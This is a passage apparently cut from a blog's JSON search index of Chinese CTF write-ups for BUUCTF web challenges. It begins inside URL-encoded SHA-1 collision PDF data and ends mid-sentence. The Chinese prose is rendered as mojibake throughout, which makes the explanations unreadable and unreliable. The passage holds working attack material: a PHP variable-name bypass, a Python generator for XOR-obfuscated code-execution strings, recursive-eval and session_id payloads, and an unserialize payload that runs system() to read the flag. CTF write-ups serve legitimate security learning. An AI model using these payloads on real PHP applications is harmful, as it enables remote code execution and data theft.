kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1`\n\nb=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926782885-7cec8231-cd06-4dc8-b096-96e3b49887a7.png)\n\n## phpå‘½åè§„åˆ™\n\nä¸€å¼€å§‹åšçš„æ—¶å€™ä»¥ä¸ºè¿™é“é¢˜å‡ºé—®é¢˜äº†ï¼Œæœ€åå‘ç°è¿™é‡Œæœ‰å‘ã€‚\n\nå…ˆæ¥çœ‹æœ¬åœ°æµ‹è¯•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ç»™NS_CTF.goä¼ å€¼ï¼Œä¼ å…¥åä¼šæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927046246-3e3675f4-af68-4d8e-9be3-1c63a5ebffff.png)\n\nå¯è§å½“æˆ‘ä»¬ä¼ å…¥çš„ç‚¹å·è¢«æ”¹ä¸ºäº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œæ˜¯å› ä¸ºç‚¹å·åœ¨phpå†…æ˜¯éæ³•å‘½åç¬¦ï¼Œä¼šè¢«è½¬åŒ–ä¸ºä¸‹åˆ’çº¿\n\nå®˜æ–¹æ–‡æ¡£ä¸­æœ‰æåˆ°ï¼šhttps://www.php.net/manual/zh/language.variables.external.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927257277-ddeecad1-21b1-4a85-be39-e28b4bd87882.png)\n\né‚£ä¹ˆè¯¥æ€ä¹ˆç»•è¿‡å‘¢ è¿™é‡Œå‚è€ƒï¼šhttps://xz.aliyun.com/t/11512\n\næ„é€ payload: `NS[CTF.go=1`å°±èƒ½ç»•è¿‡ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927514308-229d457c-463c-44b8-ab89-bda1cb695b70.png)\n\nè¿™é‡Œä¼šæŠŠç¬¬ä¸€ä¸ª`[`å…ˆè½¬åŒ–ä¸ºä¸‹åˆ’çº¿ç„¶åç¬¬äºŒä¸ªç‚¹å°±ä¸ä¼šè¢«è½¬åŒ–äº†\n\nè¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯phpè§£ææ—¶æŠŠç¬¬ä¸€ä¸ª`[`å½“ä½œäº†æ•°ç»„çš„æ ‡å¿—ä½†ä¸åˆæ³•å°±ç»™è½¬åŒ–äº† ç„¶åä»¥ä¸ºç‚¹æ˜¯æ•°ç»„é‡Œçš„å…ƒç´ åä»è€Œæ²¡æœ‰è½¬åŒ–ä¸ºä¸‹åˆ’çº¿\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927469133-3fe86fe3-7032-474b-9f2b-458df0d365ef.png)\n\nè¿™ä¸ªbugåªæœ‰å½“phpç‰ˆæœ¬å°äº8æ—¶æ‰ä¼šæœ‰ï¼šå‚è€ƒï¼šhttps://blog.csdn.net/mochu7777777/article/details/115050295\n\nphp8ç‰ˆæœ¬ä¿®å¤äº†è¿™ä¸ªbugï¼Œå¦‚å›¾\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679979254109-272268cf-7aef-41f0-af9c-6a23471c0c42.png)\n\n\n\n## æ— æ•°å­—å­—æ¯rce\n\nè¿™é‡Œç”¨åˆ°äº†å¼‚æˆ–ç»•è¿‡ï¼Œç›´æ¥è„šæœ¬ç”Ÿæˆï¼ŒçœŸçš„å¾ˆæ–¹ä¾¿ æ”¾å¤§ä½¬çš„ç†è§£ï¼šhttps://xz.aliyun.com/t/11929#toc-4 \n\næ€»ç»“çš„éå¸¸å¥½é€å½»ï¼Œæˆ‘å°±ä¸åœ¨è¿™é‡Œå¤šè¨€äº†qwq\n\næ”¾ä¸€ä¸‹æ„é€ è„šæœ¬æŠŠï¼š\n\n```python\nimport re\nimport requests\nimport urllib\nfrom sys import *\nimport os\n\n\na=[]\nans1=\"\" \nans2=\"\"\nfor i in range(0,256): #è®¾ç½®içš„èŒƒå›´\n    c=chr(i)\n    #å°†iè½¬æ¢æˆasciiå¯¹åº”çš„å­—ç¬¦ï¼Œå¹¶èµ‹å€¼ç»™c\n    tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-',c,re.I)\n    #è®¾ç½®è¿‡æ»¤æ¡ä»¶ï¼Œè®©å˜é‡cåœ¨å…¶ä¸­æ‰¾å¯¹åº”ï¼Œå¹¶åˆ©ç”¨ä¿®é¥°ç¬¦è¿‡æ»¤å¤§å°å†™ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°æœªè¢«è¿‡æ»¤çš„å­—ç¬¦\n    if(tmp):\n        continue\n        #å½“æ‰§è¡Œæ­£ç¡®æ—¶ï¼Œé‚£è¯´æ˜è¿™äº›æ˜¯è¢«è¿‡æ»¤æ‰çš„ï¼Œæ‰€ä»¥æ‰ä¼šè¢«åŒ¹é…åˆ°ï¼Œæ­¤æ—¶æˆ‘ä»¬è®©ä»–ç»§ç»­æ‰§è¡Œå³å¯\n    else:\n        a.append(i)\n        #åœ¨æ•°ç»„ä¸­å¢åŠ iï¼Œè¿™äº›å°±æ˜¯æœªè¢«ç³»ç»Ÿè¿‡æ»¤æ‰çš„å­—ç¬¦\n\n\n# eval(\"echo($c);\");\nmya=\"system\"  #å‡½æ•°å è¿™é‡Œä¿®æ”¹ï¼\nmyb=\"dir\"      #å‚æ•°\ndef myfun(k,my): #è‡ªå®šä¹‰å‡½æ•°\n    global ans1 #å¼•ç”¨å…¨å±€å˜é‡ans1ï¼Œä½¿å¾—åœ¨å±€éƒ¨å¯¹å…¶è¿›è¡Œæ›´æ”¹æ—¶ä¸ä¼šæŠ¥é”™\n    global ans2 #å¼•ç”¨å…¨å±€å˜é‡ans2ï¼Œä½¿å¾—åœ¨å±€éƒ¨å¯¹å…¶è¿›è¡Œæ›´æ”¹æ—¶ä¸ä¼šæŠ¥é”™\n    for i in range (0,len(a)): #è®¾ç½®å¾ªç¯èŒƒå›´ä¸ºï¼ˆ0ï¼Œaï¼‰æ³¨ï¼šaä¸ºæœªè¢«è¿‡æ»¤çš„å­—ç¬¦æ•°é‡ \n        for j in range(i,len(a)): #åœ¨ä¸Šä¸ªå¾ªç¯çš„æ¡ä»¶ä¸‹è®¾ç½®jçš„èŒƒå›´\n            if(a[i]^a[j]==ord(my[k])):\n                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])\n                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])\n                return;#è¿”å›å¾ªç¯è¯­å¥ä¸­ï¼Œé‡æ–°å¯»æ‰¾ç¬¬äºŒä¸ªkï¼Œè¿™é‡Œçš„è¯å°±æ˜¯å¯»æ‰¾yå¯¹åº”çš„ä¸¤ä¸ªå­—ç¬¦\nfor x in range(0,len(mya)): #è®¾ç½®kçš„èŒƒå›´\n    myfun(x,mya)#å¼•ç”¨è‡ªå®šä¹‰çš„å‡½æ•°\ndata1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1ç­‰äºä¼ å…¥çš„å‘½ä»¤,\"+ans1+\"æ˜¯å›ºå®šæ ¼å¼ï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°å˜é‡å¯¹åº”çš„å€¼ï¼Œå†ç”¨'åŒ…è£¹ï¼Œè¿™æ ·æ˜¯å˜é‡çš„å›ºå®šæ ¼å¼ï¼Œå¦ä¸€ä¸ªä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä¸¤ä¸ªåœ¨è¿›è¡ŒURLç¼–ç åè¿›è¡ŒæŒ‰ä½ä¸è¿ç®—ï¼Œç„¶åå¾—åˆ°å¯¹åº”å€¼\nprint(data1)\nans1=\"\"#å¯¹ans1è¿›è¡Œé‡æ–°èµ‹å€¼\nans2=\"\"#å¯¹ans2è¿›è¡Œé‡æ–°èµ‹å€¼\nfor k in range(0,len(myb)):#è®¾ç½®kçš„èŒƒå›´ä¸º(0,len(myb))\n    myfun(k,myb)#å†æ¬¡å¼•ç”¨è‡ªå®šä¹‰å‡½æ•°\ndata2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\"\nprint(data2)\n```\n","tags":["RCEå¥‡æ·«æ–¹å¼","PHPååºåˆ—åŒ–","linuxé€šé…ç¬¦","getshell","md5 sha1å¼ºç›¸ç­‰"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf 38-[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ","url":"/post/2ed7a105.html","content":"\nbuuctf 38-[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337192.png)\n\n\n\nå¼€å±€ä¸€å¼ å›¾ï¼Œbuuç½‘ç«™æ‰«ç½‘ç«™æœ‰æ—¶å€™å‡ºä¸æ¥ï¼Œçœ‹äº†åˆ«äººçš„wpæ˜¯gitæºç æ³„éœ²äº† å‚è€ƒå¤§ä½¬çš„æ–‡ç« ï¼šhttps://www.freebuf.com/articles/web/346607.html \n\nå¯ä»¥æ‹¿configæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹\n\næ„é€ payloadï¼š`http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git.config` \n\n â€¢ **configï¼š**æ–‡ä»¶åŒ…å«é¡¹ç›®ç‰¹æœ‰çš„é…ç½®é€‰é¡¹ï¼Œgit configå‘½ä»¤ä¼šæ”¹åŠ¨å®ƒï¼›  \n\nå‘ç°æœ‰æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ è¯´æ˜æ˜¯githubæºç æ³„éœ²\n\nä¸‹å¥½è„šæœ¬ æ„é€ payloadï¼š`python2 GitHack.py http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git` æ³¨æ„æœ«å°¾åŠ ä¸Š `.git` ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337237.png)\n\næŸ¥çœ‹index.php \n\n```php\n<?php\ninclude \"flag.php\";\necho \"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"è¿˜å·®ä¸€ç‚¹å“¦ï¼\");\n            }\n        }\n        else{\n            die(\"å†å¥½å¥½æƒ³æƒ³ï¼\");\n        }\n    }\n    else{\n        die(\"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n```\n\nä¸»è¦æ˜¯è¿‡æ»¤äº†ä¸€äº›ä¼ªåè®®å’Œä¸€äº›`â€œetâ€â€œnaâ€â€œinfoâ€â€œdecâ€â€œbinâ€â€œhexâ€â€œoctâ€â€œpiâ€â€œlogâ€`å­—ç¬¦\n\næœ€é‡è¦çš„æ˜¯ä¸­é—´ä¸€å±‚ æœ‰æˆ‘ä¸çŸ¥é“çš„æ­£åˆ™è¡¨è¾¾å¼çš„çŸ¥è¯†ç‚¹ å‚è€ƒï¼šhttps://blog.csdn.net/Manuffer/article/details/120738755\n\n```\nif(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']))\n```\n\nè¿™é‡Œ`(?R)`ä»£è¡¨å½“å‰è¡¨è¾¾å¼ ,å°±æ˜¯è¿™ä¸ª`(/[a-z,_]+((?R)?)/)`ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…`a(b(c(d())))` æ³¨æ„è¿™é‡ŒåŠ å·ä¸æ˜¯æŠŠå‰åè¿æ¥èµ·æ¥ +ï¼šåŠ å·åœ¨æ­£åˆ™è¡¨è¾¾å¼æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œç­‰åŒäºåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡\n\nå½“`;`ç­‰äºåé¢åŒ¹é…å®Œä»¥åå‰©ä½™çš„`;`æ¡ä»¶æˆç«‹  å¯ä»¥æ ¹æ®è¿™ä¸ªæ€è·¯æ„é€ å‘½ä»¤æ‰§è¡Œ\n\n### æ–¹æ³•ä¸€ï¼š\n\nlocaleconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚\n\n(PHP 4, PHP 5, PHP 7, PHP 8)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337225.png)\n\nè¿”å›ä¸€ä¸ªæ•°ç»„ ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º`.` æ„é€ payloadçš„æ—¶å€™å¯ä»¥ç”¨çš„ `.` å’Œ `./` æ„æ€ç›¸åŒéƒ½æ˜¯å½“å‰ç›®å½• `../`æ˜¯ä¸Šçº§ç›®å½• \n\ncurrent() â€” è¿”å›æ•°ç»„ä¸­çš„å½“å‰å€¼\n\nè¯´æ˜:\n\ncurrent(array|object $array): mixed\n\næ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒâ€œå½“å‰çš„â€å•å…ƒï¼Œåˆå§‹åŒ–æ—¶ä¼šæŒ‡å‘è¯¥æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337217.png)\n\næ„é€ `?exp=print_r(scandir(current(localeconv())));`\n\næ‰€ä»¥è¿™ä¸ªç»„åˆscandir(current(localeconv()))å¾ˆå¸¸ç”¨ï¼Œå¯ä»¥è®°ä¸€ä¸‹ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337258.png)\n\nå‘ç°flagæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆè¯»äº†ï¼Œå› ä¸ºç°åœ¨æŒ‡é’ˆæŒ‡åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ ä¸Š æŠŠæ•°ç»„åè½¬è¿‡æ¥è®©flagæ–‡ä»¶åœ¨æ­£æ•°ç¬¬äºŒ å†é€šè¿‡next()æŒ‡å‘ç¬¬äºŒä¸ªå…ƒç´ è¯»å–flag\n\narray_reverse() â€” è¿”å›å•å…ƒé¡ºåºç›¸åçš„æ•°ç»„\n\nnext() â€” å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½\n\nshow_source â€” åˆ«å highlight_file() ç”¨å“ªä¸ªéƒ½è¡Œ\n\næ„é€ payload:`?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337248.png)\n\n### æ–¹æ³•äºŒï¼š\n\né€šè¿‡ä¿®æ”¹phpsessionå³ä¼šè¯çŠ¶æ€ ç„¶åpayloadè¯»å‡ºæ¥å³å¯ å‚è€ƒè¿˜æ˜¯ä¸Šé¢çš„æ–‡ç«  https://blog.csdn.net/Manuffer/article/details/120738755\n\nsession_id()å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ ID,å¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„`phpsessionid`äº†ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚\n\nä½†session_idå¿…é¡»è¦å¼€å¯sessionæ‰å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆä½¿ç”¨session_startã€‚\n\næ„é€ payload:`?exp=show_source(session_id(session_start()));`\n\nbpæŠ“åŒ…ä¿®æ”¹`session_id=flag.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337617.png)\n","tags":["æºç æ³„éœ²","GitHack","(?R)","åµŒå¥—æ„é€ ","PHPSESSION"]},{"title":"buuctf 37-[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb","url":"/post/6d6051d0.html","content":"\nbuuctf [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340646.png)\n\nå‘ç°å¯ä»¥ç›´æ¥è·å–æˆ‘ä»¬çš„æ—¶é—´ï¼Œå¹¶ä¸”æ¯äº”åˆ†é’Ÿåˆ·æ–°æ›´æ–°ä¸€æ¬¡ï¼Œå¤§è‡´æ„æ€å°±æ˜¯åˆ©ç”¨ç³»ç»Ÿæ—¶åŒºè®¾ç½®ï¼Œæœ€é‡è¦çš„æ˜¯åº”è¯¥æ˜¯è¿™ä¸ªç½‘é¡µé€šè¿‡php é‡Œçš„data()å‡½æ•°æ¥è·å–å½“å‰æˆ‘ä»¬çš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨ç½‘é¡µæºä»£ç ä¸­ä¹Ÿæ ‡å‡ºæ¥äº†ï¼Œåº”è¯¥ç®—æ˜¯æç¤ºã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340325.png)\n\nå¹¶ä¸”å‘ç° é€šè¿‡postæ–¹å¼ ç»™`$func`ä¼ å€¼ä¸º `data`    `$p` ä¼ å€¼ä¸º`Y-m-d h:i:s a` data()å‡½æ•°æ ¼å¼åŒ–æ—¶é—´ç”¨çš„\n\næ‰€ä»¥å°±å¯ä»¥ ç”¨system() å‡½æ•°å‘½ä»¤æ‰§è¡Œäº† ä½†æ˜¯è‚¯å®šä¸è¡Œ è¢«æ²³èŸ¹äº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340430.png)\n\nå‘ç°éšä¾¿è¾“å…¥æ—¶ ä¼šçˆ†å‡ºcall_user_func()å‡½æ•° è¿™ä¸ªå‡½æ•°ç®€å•æ¥è¯´å°±æ˜¯ç”¨ç¬¬ä¸€ä¸ªè¾“å…¥å€¼ä½œä¸ºå›è°ƒå‡½æ•° ç¬¬äºŒä¸ªè¾“å…¥ä¸ºç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°çš„å‚æ•° \n\nç›´æ¥ä½¿ç”¨file_get_contents() æœ¬æ¥æƒ³ç›´æ¥çˆ†å‡ºflagæ–‡ä»¶çš„å†…å®¹ ä½†æ˜¯å‘½åè¢«æ”¹ä¸ºåˆ«çš„å½¢å¼äº† å‘¢å°±çˆ†ä¸€ä¸‹index.phpçœ‹ä¸€ä¸‹é»‘åå•\n\n```plain\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n\n\nçœ‹åˆ°ç±»å°±æƒ³åˆ°ååºåˆ—åŒ–æ¼æ´ å°†ç±»ä¸­çš„å±æ€§å€¼æ”¹ä¸ºæˆ‘ä»¬å¯ä»¥æ¶æ„æ“ä½œçš„å€¼ ç„¶åç»™`$func`ä¼ ååºåˆ—åŒ–å‡½æ•°ï¼Œç»™`p`ä¼ æˆ‘ä»¬çš„åºåˆ—åŒ–ç»“æœã€‚\n\næ€è·¯å°±æ˜¯ç›´æ¥ååºåˆ—åŒ–å°†åŸæœ¬postå€¼ä¿®æ”¹ ä¸é€šè¿‡é»‘åå•ç­›é€‰\n\næœ¬åœ°æ„é€ ï¼š\n\n```php\n<?php\n    class Test {\n        var $p = \"ls /\";\n        var $func = \"system\";}\n$a = new Test;\necho serialize($a);\n?>\n```\n\næ„é€ payloadï¼š`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:4:\"ls /\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340578.png)\n\nå‘ç°å¹¶æ²¡æœ‰flagæ–‡ä»¶ æ‰€ä»¥åªèƒ½é€šè¿‡findæŒ‡ä»¤å¯»æ‰¾äº† è¿™é‡Œçœç•¥ æˆ‘è¿™é‡Œfindæ‰¾ä¸å‡ºæ¥æ²¡æœ‰å›å“ ç¯å¢ƒæœ‰é—®é¢˜\n\næœ€åæ„é€ payloadï¼š`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"cat /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340505.png)\n","tags":["æ–‡ä»¶åŒ…å«","ååºåˆ—åŒ–","ä»£ç å®¡è®¡"],"categories":["buuctf"]},{"title":"buuctf 36-[BUUCTF 2018]Online Tool","url":"/post/9efd4054.html","content":"\nbuuctf [BUUCTF 2018]Online Tool\n\n<!--more-->\n\næºç é™„ä¸Š\n\n```php\n<?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\nif(!isset($_GET['host'])) {\n    highlight_file(__FILE__);\n} else {\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n}\n```\n\næœ‰è®¸å¤šä¸æ¸…æ¥šçš„çŸ¥è¯†ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥çœ‹\n\n$_SERVER\n\n$_SERVER æ˜¯PHPé¢„å®šä¹‰çš„è¶…å…¨å±€å˜é‡ã€‚æ‰€è°“â€œè¶…å…¨å±€å˜é‡â€ï¼Œå³åœ¨è„šæœ¬å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä¿å­˜å…³äºæŠ¥å¤´ã€è·¯å¾„å’Œè„šæœ¬ä½ç½®çš„ä¿¡æ¯ã€‚\n\n$_SERVERè¯¦è§£\n$_SERVER[â€˜HTTP_ACCEPT_LANGUAGEâ€™]//æµè§ˆå™¨è¯­è¨€\n$_SERVER[â€˜REMOTE_ADDRâ€™] //å½“å‰ç”¨æˆ· IP ã€‚\n$_SERVER[â€˜REMOTE_HOSTâ€™] //å½“å‰ç”¨æˆ·ä¸»æœºå\n$_SERVER[â€˜REQUEST_URIâ€™] //URL\n$_SERVER[â€˜REMOTE_PORTâ€™] //ç«¯å£ã€‚\n$_SERVER[â€˜SERVER_NAMEâ€™] //æœåŠ¡å™¨ä¸»æœºçš„åç§°ã€‚\n$_SERVER[â€˜PHP_SELFâ€™]//æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å\n$_SERVER[â€˜argvâ€™] //ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°ã€‚\n$_SERVER[â€˜argcâ€™] //ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ã€‚\n$_SERVER[â€˜GATEWAY_INTERFACEâ€™]//CGI è§„èŒƒçš„ç‰ˆæœ¬ã€‚\n$_SERVER[â€˜SERVER_SOFTWAREâ€™] //æœåŠ¡å™¨æ ‡è¯†çš„å­—ä¸²\n$_SERVER[â€˜SERVER_PROTOCOLâ€™] //è¯·æ±‚é¡µé¢æ—¶é€šä¿¡åè®®çš„åç§°å’Œç‰ˆæœ¬\n$_SERVER[â€˜REQUEST_METHODâ€™]//è®¿é—®é¡µé¢æ—¶çš„è¯·æ±‚æ–¹æ³•\n$_SERVER[â€˜QUERY_STRINGâ€™] //æŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²ã€‚\n$_SERVER[â€˜DOCUMENT_ROOTâ€™] //å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æ–‡æ¡£æ ¹ç›®å½•\n$_SERVER[â€˜HTTP_ACCEPTâ€™] //å½“å‰è¯·æ±‚çš„ Accept: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTP_ACCEPT_CHARSETâ€™] //å½“å‰è¯·æ±‚çš„ Accept-Charset: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTP_ACCEPT_ENCODINGâ€™] //å½“å‰è¯·æ±‚çš„ Accept-Encoding: å¤´éƒ¨çš„å†…å®¹\n$_SERVER[â€˜HTTP_CONNECTIONâ€™] //å½“å‰è¯·æ±‚çš„ Connection: å¤´éƒ¨çš„å†…å®¹ã€‚ä¾‹å¦‚ï¼šâ€œKeep-Aliveâ€ã€‚\n$_SERVER[â€˜HTTP_HOSTâ€™] //å½“å‰è¯·æ±‚çš„ Host: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTP_REFERERâ€™] //é“¾æ¥åˆ°å½“å‰é¡µé¢çš„å‰ä¸€é¡µé¢çš„ URL åœ°å€ã€‚\n$_SERVER[â€˜HTTP_USER_AGENTâ€™] //å½“å‰è¯·æ±‚çš„ User_Agent: å¤´éƒ¨çš„å†…å®¹ã€‚\n$_SERVER[â€˜HTTPSâ€™]//å¦‚æœé€šè¿‡httpsè®¿é—®,åˆ™è¢«è®¾ä¸ºä¸€ä¸ªéç©ºçš„å€¼(on)ï¼Œå¦åˆ™è¿”å›off\n$_SERVER[â€˜SCRIPT_FILENAMEâ€™] #å½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„åã€‚\n$_SERVER[â€˜SERVER_ADMINâ€™] #ç®¡ç†å‘˜ä¿¡æ¯\n$_SERVER[â€˜SERVER_PORTâ€™] #æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ç«¯å£\n$_SERVER[â€˜SERVER_SIGNATUREâ€™] #åŒ…å«æœåŠ¡å™¨ç‰ˆæœ¬å’Œè™šæ‹Ÿä¸»æœºåçš„å­—ç¬¦ä¸²ã€‚\n$_SERVER[â€˜PATH_TRANSLATEDâ€™] #å½“å‰è„šæœ¬æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿï¼ˆä¸æ˜¯æ–‡æ¡£æ 